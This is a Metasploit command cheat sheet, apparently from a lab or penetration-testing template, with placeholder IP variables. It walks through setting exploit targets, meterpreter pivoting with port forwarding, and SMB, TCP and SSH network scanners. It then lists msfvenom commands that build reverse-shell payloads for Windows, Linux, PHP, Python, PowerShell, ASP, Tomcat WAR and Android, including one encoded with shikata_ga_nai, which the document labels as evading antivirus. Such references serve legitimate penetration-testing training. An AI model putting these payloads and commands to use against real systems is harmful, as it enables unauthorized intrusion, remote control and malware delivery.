...
# Set target host
msf6 exploit(...) > set RHOSTS ${REMOTE_NODE_IP}
...
msf6 exploit(...) > set LHOST ${REMOTE_NODE_IP}
...
meterpreter > netstat
meterpreter > route
meterpreter > portfwd add -l 8080 -p 80 -r ${PRIVATE_IP}
...
# SMB Version Scanner
msf6 > use auxiliary/scanner/smb/smb_version
msf6 auxiliary(scanner/smb/smb_version) > set RHOSTS ${REMOTE_NODE_IP}/24
msf6 auxiliary(...) > run

# Port Scanner
msf6 > use auxiliary/scanner/portscan/tcp
msf6 auxiliary(...) > set RHOSTS ${REMOTE_NODE_IP}
msf6 auxiliary(...) > set PORTS 1-1000
msf6 auxiliary(...) > run

# SSH Version Scanner
msf6 > use auxiliary/scanner/ssh/ssh_version
msf6 auxiliary(...) > set RHOSTS ${REMOTE_NODE_IP}/24
msf6 auxiliary(...) > run
...
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=${REMOTE_NODE_IP} LPORT=4444 -f exe -o shell.exe

# Linux reverse shell
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=${REMOTE_NODE_IP} LPORT=4444 -f elf -o shell.elf

# PHP reverse shell
msfvenom -p php/meterpreter/reverse_tcp LHOST=${REMOTE_NODE_IP} LPORT=4444 -f raw -o shell.php

# Python reverse shell
msfvenom -p python/meterpreter/reverse_tcp LHOST=${REMOTE_NODE_IP} LPORT=4444 -f raw -o shell.py

# PowerShell payload
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=${REMOTE_NODE_IP} LPORT=4444 -f psh -o shell.ps1

# ASP web shell
msfvenom -p windows/meterpreter/reverse_tcp LHOST=${REMOTE_NODE_IP} LPORT=4444 -f asp -o shell.asp

# WAR file (Tomcat)
msfvenom -p java/meterpreter/reverse_tcp LHOST=${REMOTE_NODE_IP} LPORT=4444 -f war -o shell.war

# Android APK
msfvenom -p android/meterpreter/reverse_tcp LHOST=${REMOTE_NODE_IP} LPORT=4444 -o shell.apk

# Encoded payload (evade AV)
msfvenom -p windows/meterpreter/reverse_tcp LHOST=${REMOTE_NODE_IP} LPORT=4444 -e x86/shikata_ga_nai -i 5 -f exe -o encoded.exe
...
msf6 exploit(multi/handler) > set LHOST ${REMOTE_NODE_IP}
